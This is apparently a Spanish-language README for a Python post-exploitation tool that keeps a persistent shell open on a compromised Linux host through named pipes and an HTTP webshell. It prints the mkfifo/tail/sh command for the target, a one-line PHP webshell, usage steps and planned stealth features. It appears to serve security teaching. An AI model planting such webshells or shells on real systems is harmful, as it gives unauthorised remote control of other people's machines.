# mkfifo-ForwardShell-Python

![Python 3.x](https://img.shields.io/badge/Python-3.x-blue.svg)
![Linux](https://img.shields.io/badge/OS-Linux-informational.svg)
![Type](https://img.shields.io/badge/Type-Post--Exploitation-red.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg) ---

### 📄 Descripción General del Proyecto

Este proyecto implementa un `Forward Shell` persistente y semi-interactivo utilizando `Python3` en el lado del atacante y el concepto de **Named Pipes (FIFOs)** de Unix en el sistema objetivo. Es una herramienta poderosa para mantener el control sobre un sistema Linux comprometido, simulando una conexión de shell directa a través de un canal web (como una webshell).

El objetivo principal de este proyecto es **demostrar y educar** sobre cómo los `Named Pipes` (`mkfifo`) pueden ser aprovechados en un contexto de post-explotación para establecer una comunicación bidireccional estable, incluso cuando las conexiones directas están limitadas o monitoreadas.

### 💡 ¿Por qué `mkfifo` para una Shell? (Concepto Educativo)

En el hacking ético y la seguridad, establecer una "shell" (una interfaz de línea de comandos) en un sistema comprometido es un paso crucial. Tradicionalmente, se usan `reverse shells` (la víctima se conecta al atacante) o `bind shells` (el atacante se conecta a un puerto abierto en la víctima). Sin embargo, estas pueden ser inestables, ruidosas o bloqueadas por firewalls.

Aquí es donde entran los `Named Pipes` o FIFOs (First-In, First-Out):

* **¿Qué es un FIFO?** Un FIFO es un tipo especial de archivo en sistemas Unix/Linux que actúa como un "tubo" (pipe) pero tiene un nombre en el sistema de archivos. A diferencia de los pipes anónimos (como `|`), un FIFO existe en el disco y puede ser abierto por diferentes procesos en diferentes momentos.
* **¿Cómo lo usamos para una Shell?** Creamos dos FIFOs:
    * Un **`FIFO de entrada`** (`.input`): donde el atacante "escribirá" los comandos.
    * Un **`FIFO de salida`** (`.output`): donde la salida de los comandos ejecutados en la víctima se "escribirá".
* **La Magia del `tail -f` y `/bin/sh`:**
    * En la máquina objetivo, se ejecuta un comando como: `mkfifo input_fifo; tail -f input_fifo | /bin/sh 2>&1 > output_fifo`
    * `mkfifo input_fifo`: Crea el FIFO de entrada.
    * `tail -f input_fifo`: Este comando se queda "escuchando" indefinidamente por cualquier cosa que se escriba en `input_fifo`.
    * `| /bin/sh`: Cualquier cosa que `tail -f` lea se pasa directamente a `/bin/sh` (la shell de comandos) para su ejecución.
    * `2>&1 > output_fifo`: Esto redirige tanto la salida estándar (`stdout`) como la salida de error estándar (`stderr`) de la shell (`/bin/sh`) al `output_fifo`.
* **Comunicación Persistente:** Una vez que este setup está en la máquina objetivo, el atacante solo necesita "escribir" comandos en el `input_fifo` (a través de la webshell) y luego "leer" la salida del `output_fifo` (también a través de la webshell). Esto crea una shell persistente y interactiva.

### ✨ Características y Funcionalidades

* **Shell Interactiva Basada en FIFOs:** Utiliza `mkfifo` para establecer una comunicación bidireccional y persistente.
* **Conexión Vía Webshell:** Se comunica con la máquina objetivo a través de peticiones HTTP (GET), simulando la interacción con una webshell básica.
* **Codificación Base64:** Los comandos se codifican en Base64 para evitar problemas con caracteres especiales o metacaracteres de URL, y se decodifican en el objetivo antes de la ejecución.
* **Limpieza Automática:** Elimina los FIFOs temporales del sistema objetivo al finalizar la sesión (al presionar `Ctrl+C` o usar el comando `exit`).
* **Generación de IDs de Sesión Aleatorios:** Utiliza un número aleatorio para los nombres de los FIFOs, ayudando a evitar colisiones y dándole un toque de ofuscación.
* **Manejo Básico de Errores:** Incluye `try-except` para errores de conexión HTTP, garantizando una experiencia de usuario más robusta.

### 🚀 Tecnologías y Herramientas Utilizadas

* **Lenguaje de Programación:** Python 3.x
* **Librerías Python:**
    * `requests`: Para realizar peticiones HTTP a la webshell.
    * `base64`: Para codificar/decodificar comandos.
    * `os`, `sys`, `signal`, `time`, `random`: Para operaciones de sistema, manejo de señales, temporización, etc.
* **Conceptos de Sistema Operativo:**
    * `mkfifo` (Named Pipes)
    * Redirección de entrada/salida (`>`, `2>&1`)
    * Piping (`|`)
    * Comando `tail -f`
    * `/bin/sh` (Bourne Shell)

### 🛠️ Pre-requisitos y Configuración

1.  **Máquina Atacante:** Un sistema con Python 3.x y las librerías `requests` instaladas.
    * `pip install requests`
2.  **Máquina Objetivo (Comprometida):**
    * Un sistema basado en **Linux/Unix** con la capacidad de ejecutar `mkfifo`, `tail`, `cat` y `/bin/sh`.
    * Una **webshell** funcional accesible vía HTTP (por ejemplo, `index.php` con un parámetro `cmd` que ejecuta comandos como `system()` o `shell_exec()`).
    * **Ejemplo mínimo de `index.php` (para el servidor web comprometido):**
        ```php
        <?php system($_GET['cmd']); ?>
        ```
        (Advertencia: ¡Esta webshell es extremadamente vulnerable y solo para entornos de laboratorio!)

### ⚙️ Cómo Usar el Forward Shell

1.  **Clonar el Repositorio:**
    ```bash
    git clone https://github.com/Zm0kSec/ForwardSHell-Unix.git
    ```
2.  **Configurar la URL de la Webshell:**
    * Abre el script `ForwardShell.py` y edita la variable `main_url` para que apunte a la URL de tu webshell en la máquina objetivo.
        ```python
        main_url = "http://[IP_DEL_OBJETIVO]/index.php"
        ```
3.  **Ejecutar el Cliente (Atacante):**
    ```bash
    python3 ForwardShell.py
    ```
4.  **Interactuar con la Shell:**
    * El script imprimirá un mensaje de "Estableciendo Forward Shell. Asegúrate que la webshell sea accesible."
    * Verás un prompt como `shell-[ID_SESION]>`.
    * Escribe tus comandos y presiona Enter. La salida aparecerá en tu consola.
    * Para salir, escribe `exit` o presiona `Ctrl+C`. El script intentará limpiar los FIFOs en el objetivo.

### ⚠️ Advertencias y Consideraciones Éticas

* Este proyecto está diseñado **exclusivamente con fines educativos y de investigación en ciberseguridad**.
* **Nunca uses esta herramienta contra sistemas sin el permiso explícito y escrito de sus propietarios.**
* El uso de herramientas de este tipo para actividades maliciosas es ilegal y puede tener graves consecuencias.
* El autor no se hace responsable del uso indebido de esta herramienta.

### 🗺️ Roadmap (Posibles Mejoras Futuras)

* Implementar cifrado en las comunicaciones HTTP para mayor sigilo.
* Añadir opciones para reconexión automática.
* Soporte para múltiples tipos de webshells.
* Detección y manejo de errores de permisos en el objetivo.
* Ofuscación del tráfico HTTP.

### ✉️ Contacto

Zm0kSec
www.linkedin.com/in/benedicto-palma-verdugo-094931301
https://github.com/Zm0kSec
